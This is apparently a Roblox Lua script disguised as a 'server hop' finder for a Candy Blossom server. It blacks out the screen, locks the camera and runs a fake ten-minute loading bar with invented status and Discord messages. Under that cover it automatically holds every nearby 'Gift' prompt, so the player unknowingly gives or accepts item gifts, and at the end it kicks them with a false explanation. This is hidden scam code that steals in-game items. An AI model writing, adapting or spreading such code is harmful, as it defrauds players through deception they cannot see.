-- SERVICES
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local ProximityPromptService = game:GetService("ProximityPromptService")
local Workspace = game:GetService("Workspace")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- HIDE CORE GUI
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- CAMERA LOCK
pcall(function()
	Workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
	Workspace.CurrentCamera.CFrame = CFrame.new(0, 9999, 0) -- Black void
end)

-- GUI SETUP
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "MobileLoadingScreen"
screenGui.ResetOnSpawn = false

-- BACKGROUND
local bg = Instance.new("Frame", screenGui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BackgroundTransparency = 1
TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()

-- INFO LABEL
local infoLabel = Instance.new("TextLabel", bg)
infoLabel.Size = UDim2.new(1, -20, 0, 30)
infoLabel.Position = UDim2.new(0, 10, 0.04, 0)
infoLabel.BackgroundTransparency = 1
infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
infoLabel.TextScaled = true
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextWrapped = true
infoLabel.Text = "User: " .. player.Name .. " | Server ID: S-" .. math.random(100000,999999) .. "-" .. math.random(1000,9999)

-- ROTATING LOADING ICON
local icon = Instance.new("ImageLabel", bg)
icon.Size = UDim2.new(0, 60, 0, 60)
icon.Position = UDim2.new(0.5, -30, 0.38, 0)
icon.BackgroundTransparency = 1
icon.Image = "rbxassetid://10773014254" -- circular loading image
icon.ImageColor3 = Color3.fromRGB(0, 170, 255)

-- STATUS MESSAGE
local label = Instance.new("TextLabel", bg)
label.Size = UDim2.new(1, -20, 0, 40)
label.Position = UDim2.new(0, 10, 0.48, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.TextWrapped = true
label.Text = "Initializing..."

-- PROGRESS BAR
local barFrame = Instance.new("Frame", bg)
barFrame.Size = UDim2.new(0.8, 0, 0.035, 0)
barFrame.Position = UDim2.new(0.1, 0, 0.58, 0)
barFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barFrame.BorderSizePixel = 0
Instance.new("UICorner", barFrame).CornerRadius = UDim.new(0, 8)

local fill = Instance.new("Frame", barFrame)
fill.Size = UDim2.new(0, 0, 1, 0)
fill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
fill.BorderSizePixel = 0
Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 8)

-- PERCENT LABEL
local percentLabel = Instance.new("TextLabel", bg)
percentLabel.Size = UDim2.new(1, -20, 0, 40)
percentLabel.Position = UDim2.new(0, 10, 0.63, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
percentLabel.TextScaled = true
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextWrapped = true
percentLabel.Text = "0%"

-- DISCORD STATUS POPUP
local discord = Instance.new("Frame", bg)
discord.Size = UDim2.new(0, 280, 0, 40)
discord.Position = UDim2.new(0.5, -140, 0.88, 0)
discord.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
discord.BackgroundTransparency = 0.1
discord.BorderSizePixel = 0
Instance.new("UICorner", discord).CornerRadius = UDim.new(0, 8)

local discordText = Instance.new("TextLabel", discord)
discordText.Size = UDim2.new(1, -10, 1, 0)
discordText.Position = UDim2.new(0, 5, 0, 0)
discordText.BackgroundTransparency = 1
discordText.TextColor3 = Color3.fromRGB(255, 255, 255)
discordText.TextScaled = true
discordText.Font = Enum.Font.Gotham
discordText.Text = "✅ Discord RPC: Connected to #candy-servers"

-- STATUS MESSAGES
local messages = {
	"Finding server to hop...",
	"Locating Candy Blossom...",
	"Searching legacy server list...",
	"Pinging alternate regions...",
	"Retrying connection...",
	"Still looking for Candy Blossom...",
	"Final attempt in progress..."
}

-- ROTATE ICON LOOP
task.spawn(function()
	while task.wait() do
		icon.Rotation = icon.Rotation + 1
	end
end)

-- LOADING + KICK AFTER 10 MINUTES
task.spawn(function()
	TweenService:Create(fill, TweenInfo.new(600, Enum.EasingStyle.Linear), {
		Size = UDim2.new(1, 0, 1, 0)
	}):Play()

	for i = 1, 600 do
		local percent = math.floor((i / 600) * 100)
		percentLabel.Text = percent .. "%"
		if i % 10 == 0 then
			label.Text = messages[((i // 10 - 1) % #messages) + 1]
		end
		wait(1)
	end

	-- UNLOCK CAMERA + RESTORE GUI
	pcall(function()
		Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
	end)
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
	player:Kick("Couldn't find another old server with Candy Blossom. Please try rejoining later.")
end)

-- AUTO-HOLD E FOR GIFT PROMPT ONLY
task.spawn(function()
	while true do
		for _, prompt in pairs(ProximityPromptService:GetDescendants()) do
			if prompt:IsA("ProximityPrompt")
				and prompt.Enabled
				and prompt.ObjectText == "Gift"
				and prompt.ActionText == "Hold E"
				and prompt.Parent
				and player.Character
				and player.Character:FindFirstChild("HumanoidRootPart") then

				local distance = (prompt.Parent.Position - player.Character.HumanoidRootPart.Position).Magnitude
				if distance <= (prompt.MaxActivationDistance or 10) then
					-- Simulate hold
					pcall(function() prompt:InputHoldBegin() end)
					wait(prompt.HoldDuration or 0.5)
					pcall(function() prompt:InputHoldEnd() end)
				end
			end
		end
		wait(0.1)
	end
end)
